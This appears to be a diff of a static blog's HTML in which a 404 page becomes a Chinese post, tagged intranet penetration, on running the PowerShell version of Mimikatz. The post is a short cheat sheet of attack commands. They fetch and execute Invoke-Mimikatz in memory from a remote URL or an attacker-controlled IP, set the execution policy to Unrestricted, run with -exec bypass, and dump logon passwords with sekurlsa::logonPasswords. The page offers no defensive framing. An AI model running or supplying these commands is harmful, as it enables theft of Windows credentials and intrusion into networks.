@@ -10,7 +10,7 @@
     
     
     
-    <title>404 | sunflowers&#39;s Blog</title>
+    <title>mimikatz ps1脚本使用 | sunflowers&#39;s Blog</title>
     <link href="http://www.sunflowers.vip" rel="prefetch" />
 
     
@@ -185,10 +185,96 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <!-- 搜索页面(尽可能接近ZanBlog搜索功能) -->
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://www.sunflowers.vip">sunflowers&#39;s Blog</a>
+        >
+        <span>mimikatz ps1脚本使用</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/mimikatz%20ps1/">mimikatz ps1脚本使用</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2021-09-13
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/mimikatz%20ps1/">mimikatz ps1脚本使用</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2021-09-13
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h3 id="Powershell版Mimikatz脚本使用"><a href="#Powershell版Mimikatz脚本使用" class="headerlink" title="Powershell版Mimikatz脚本使用"></a>Powershell版Mimikatz脚本使用</h3><p>********Invoke-Mimikatz.ps1脚本地址:*********<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1</a></p>
+<p><strong>有网络环境下执行命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;脚本地址&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
 
-<!-- 404 自定义页面 -->
-<!-- 有其他想自定义的page在这里添加判断条件, 并且写好对应的模板渲染文件 -->
+<p><strong>本地环境执行命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://IP/&#x27;);Invoke-Mimikatz -DumpCreds&quot;   （本地开启服务下载ps1脚本）</span><br></pre></td></tr></table></figure>
+
+<p><strong>远程下载ps1脚本到本地</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object</span><br><span class="line">System.Net.Webclient).DownloadFile(&#x27;ps1脚本地址&#x27;;&#x27;C:\Users\Administrator\Desktop\Invoke-Mimikatz.ps1&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>本地导入脚本执行</strong></p>
+<p>查看脚本执行限制     Get-ExecutionPolicy</p>
+<p>设置为允许任意脚本执行     Set-ExecutionPolicy Unrestricted</p>
+<p>导入命令    Import-Module .\Invoke-Mimikatz.ps1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>本地绕过权限执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -Command &quot;Import-Module ./Invoke-Mimikatz.ps1;Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+</article>
+
 
                 </div>
                 <aside class="col-md-4 gal-left" id="sidebar">
@@ -295,17 +381,17 @@
 
                 
                 <li>
-                    <a href="/404.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/mimikatz%20ps1/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/404.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/mimikatz%20ps1/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/404.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/mimikatz%20ps1/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
@@ -313,9 +399,9 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/powershell/" style="font-size: 12.918567546337208px;" class="tag-cloud-link">powershell</a>
+    <a href="/tags/powershell/" style="font-size: 17.030839608316057px;" class="tag-cloud-link">powershell</a>
     
-    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 16.166602896988408px;" class="tag-cloud-link">内网渗透</a>
+    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 16.256802141785304px;" class="tag-cloud-link">内网渗透</a>
     
 </div>
                 
